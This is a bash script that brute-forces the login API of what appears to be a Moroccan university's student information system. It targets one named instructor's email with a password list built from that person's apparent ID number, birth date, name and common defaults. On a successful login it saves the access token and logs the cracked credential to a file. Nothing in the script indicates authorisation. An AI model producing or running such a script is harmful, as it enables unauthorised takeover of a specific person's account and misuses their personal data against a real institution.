#!/bin/bash
# Aggressive password brute-force for instructor portal
BASE="https://sis-api.emsi.ma"
EMAIL="y.safsouf@emsi.ma"

# Generate permutations of known data
KNOWN=(
    # instructorID based
    "937" "instructor937" "Instructor937" "INS937" "ins937"
    "prof937" "Prof937" "teacher937" "Teacher937"
    # SSN based
    "EE56091" "ee56091" "56091" "EE56091ee"
    # DOB based  
    "1984" "01011984" "19840101" "010184"
    "01011984" "01-01-1984" "1984-01-01"
    "01011984!" "1984!" "1984@"
    # Name based combinations
    "Safsouf" "Yassine" "SAFSOUF" "YASSINE"
    "Safsouf1984" "Yassine1984" "safsouf1984"
    "Safsouf@1984" "Yassine@1984"
    "safsouf@1984" "yassine@1984"
    "safsoufyassine" "SafsoufYassine"
    # with year
    "safsouf2024" "Safsouf2024" "safsouf2025" "Safsouf2025"
    "safsouf2026" "Safsouf2026"
    "yassine2024" "Yassine2024" "yassine2025" "Yassine2025"
    # Email based
    "y.safsouf" "y.safsouf@2024" "y.safsouf@2025"
    "y.safsouf2024" "ysafsouf" "YSafsof"
    # Default patterns
    "emsi" "emsi2024" "emsi2025" "emsi2026"
    "Emsi2024" "Emsi2025" "Emsi2026"
    "EMSIMarrakech" "emsi.marrakech"
    "emsi@marrakech" "emsi-marrakech"
    # Common instructor defaults
    "instructor" "instructor123" "instructor@123"
    "Instructor@123" "Instructor123"
    "teacher" "teacher123" "teacher@123"
    "prof" "prof123" "prof@123" "Prof@123"
    "password" "password123" "Password123"
    "P@ssw0rd" "P@ssword" "p@ssword"
    "Passer@123" "passer" "passer123"
    "admin" "admin123" "Admin@123"
    "admin@emsi" "admin_emsi"
    # Moroccan context
    "Maroc@2024" "Maroc@2025" "Maroc@2026"
    "Morocco@2024" "Morocco@2025" "Morocco@2026"
    "Marrakech@1" "Marrakech@2024"
    # Common weak
    "123456" "12345678" "123456789"
    "qwerty" "azerty" "qwerty123" "azerty123"
    "azerty@123" "qwerty@123"
    "azerty2024" "qwerty2024"
    # Combinations of first+last
    "YassineSafsouf" "yassine.safsouf"
    "Yassine.Safsouf" "Yassine_Safsouf"
    "Safsouf.Yassine" "safsouf.yassine"
    # IIR specific
    "IIR" "iir" "IIR@2024" "IIR2024"
    "iir@emsi" "IIR.emsi"
    # French
    "bonjour" "Bonjour" "Bonjour123"
    "Bienvenue" "bienvenue" "Bienvenue123"
    "professeur" "Professeur" "Professeur123"
    # plus numbers
    "111111" "000000" "121212"
    "1234" "12345" "1234567890"
    # with bang
    "Safsouf!" "Yassine!" "safsouf!" "yassine!"
    "Safsouf@2024!" "Yassine@2024!"
    "emsi!" "EMSIMarrakech!"
    # uppercase
    "SAFSOUF@2024" "YASSINE@2024"
    "SAFSOUF2024" "YASSINE2024"
)

echo "[*] Brute forcing: $EMAIL"
echo "[*] Trying ${#KNOWN[@]} passwords..."

COUNT=0
for pwd in "${KNOWN[@]}"; do
    result=$(curl -s -w "\n%{http_code}" -X POST "$BASE/v1/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$EMAIL\",\"password\":\"$pwd\",\"userType\":\"INSTRUCTOR\"}" 2>&1)
    code=$(echo "$result" | tail -1)
    ((COUNT++))
    
    if [ "$code" = "201" ] || [ "$code" = "200" ]; then
        echo "  ✅ [#$COUNT] SUCCESS! Password: '$pwd'"
        echo "$result" | sed '$d' > /tmp/instructor_login_success.json
        echo "$EMAIL:$pwd" >> /home/ayoub/projects/cyper/cracked_passwords.txt
        python3 -c "
import json
d = json.load(open('/tmp/instructor_login_success.json'))
print('Token:', d.get('accessToken', 'N/A')[:80] + '...')
" 2>/dev/null
        exit 0
    fi
done

echo "  ❌ Tried $COUNT passwords, none worked"
